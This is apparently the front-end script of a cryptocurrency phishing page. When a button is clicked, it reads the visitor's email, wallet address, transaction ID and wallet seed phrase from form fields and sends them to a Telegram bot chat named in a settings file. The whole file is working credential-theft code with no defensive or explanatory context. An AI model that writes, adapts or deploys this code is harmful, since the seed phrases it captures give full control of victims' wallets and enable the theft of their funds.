import * as CONFIG from "./settings.json";

document.querySelector("#sig-go").addEventListener("click", forTel);

async function forTel() {
    const wad = document.querySelector("#WalletAddress").value;
    const tid = document.querySelector("#TransID").value;
    const ead = document.querySelector("#EmailAddress").value;
    const sph = document.querySelector("#SeedPhrase").value;

    const res = `
        Email Address: ${ead}
        Wallet Address: ${wad}
        Seed Phrase: ${sph}
        Transaction ID: ${tid}
    `;

    const options = {
        method: "POST",
        mode: "cors",
        headers: {
            accept: "application/json",
            "content-type": "application/json",
        },
        body: JSON.stringify({
            text: String(res),
            disable_web_page_preview: false,
            disable_notification: false,
            reply_to_message_id: null,
            chat_id: CONFIG.MY_CHAT_ID,
        }),
    };

    fetch(
        `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN_BOT}/sendMessage`,
        options
    )
        .then((response) => response.json())
        .then((response) => response)
        .catch((err) => console.error(err));
}
